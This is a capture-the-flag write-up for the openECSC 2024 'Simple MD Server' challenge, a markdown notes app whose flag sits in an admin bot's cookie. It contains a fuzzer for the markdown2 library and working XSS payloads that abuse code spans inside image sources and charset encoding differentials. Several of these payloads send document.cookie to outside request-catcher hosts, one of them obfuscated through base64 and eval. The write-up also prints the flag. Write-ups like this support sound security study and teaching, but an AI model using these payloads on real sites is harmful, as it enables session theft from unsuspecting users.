#md #xss #fuzzer #charset 
# ecsc24 - Simple MD Server
## Description
Yes, another markdown editor, but this time we keep it simple!
Site: [http://simplemdserver.challs.open.ecsc2024.it:47008](http://simplemdserver.challs.open.ecsc2024.it:47008)
## Overview
Classic notes app, supports **markdown**.
## Road to flag
The flag is inside admin bot's cookies:
```js
r = requests.post(
	BOT_HOST,
	headers={"X-Auth": BOT_SECRET},
	json={
		"actions": [
			{
					"type": "request",
					"url": CHALL_HOST,
			},
			{
					"type": "set-cookie",
					"name": "flag",
					"value": FLAG,
			},
			{
					"type": "request",
					"url": visit_url,
			},
		]
	},
)
```
-> XSS

## Exploit (unintended solution)
I just fuzzed the markdown parser:
```python
import markdown2
import random
from bs4 import BeautifulSoup

def generate_random_md(codes):
    random_md = []
    length = random.randint(1, 50)
    payload = "//onerror=fetch(\"http://g106vnrl.requestrepo.com/?c=\"+document.cookie)"

    for i in range(length):
        random_index = random.randint(0, len(codes) - 1)
        if i == 0:
            random_md.append(codes[random_index].format(p=payload))
        else:
            random_md.append(codes[random_index].format(p=random_md[-1]))

    return ' '.join(random_md)


def check_for_unusual_attributes(element):
    usual_attributes = ['alt','src','href','title']
    found_attributes = set()
    soup = BeautifulSoup(element, 'html.parser')

    for tag in soup.find_all(True):
        for attr in tag.attrs:
            if attr not in usual_attributes:
                found_attributes.add(attr)
    
    return found_attributes

def start_fuzzing():
    codes = ["[{p}]({p})","https://x.com/?{p}","id=1","({p})","![{p}]({p})","`{p}`","*{p}*","> {p}","__{p}__",
    "# {p}","- {p}","[{p}]:","{p}\n-------------","> 1. {p}","[{p}][]\n[{p}]: http://{p}","![{p}][]\n[{p}]: http://{p}? \"{p}\"", "<p>{p}</p>", "<svg>"]

    try:
        while True:
            random_md = generate_random_md(codes)
            html = markdown2.markdown(random_md, safe_mode="escape")
            unusual_attributes = check_for_unusual_attributes(html)
            if unusual_attributes:
                print('Generated BBCode:', random_md)
                print('Unusual attributes found:', unusual_attributes)
                with open("payload.txt","w") as file:
                    file.write(random_md)
                break 
    except:
        pass

if __name__ == "__main__":
    start_fuzzing()
```
And came up with a payload that triggers xss:
```
![](`" onerror=alert()//`)
```
Why this works? The library inserts code blocks into img `src` attribute, and does not escape quotes in `code` blocks.

`openECSC{K33P_I7_51Mple____?}`


#### Intended solution
The intended solution leverages [encoding differentials](<TL;DR: https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/>)
```
payload = URL + '/preview?x=aaa%1B(Baaaaa' + 'a%1B$@!2%1B(B' * 200 + f'''aaaaa%1B(B ![img%1B$@!](file://a)%1B(B ![red]( onerror=location.assign('{hook_url}?'%26%2343;document.cookie) )wwwww'''

// or

JS = "fetch('https://pwn.requestcatcher.com/pwn?' + document.cookie); while(1);"
JS = f"eval(atob('{base64.b64encode(JS.encode()).decode()}'))"

PAYLOAD = b"[\x1b(B](pwn '\x1b$@')[pwn]( url#= ' autofocus onfocus=" + JS.encode() + b"//')"
```
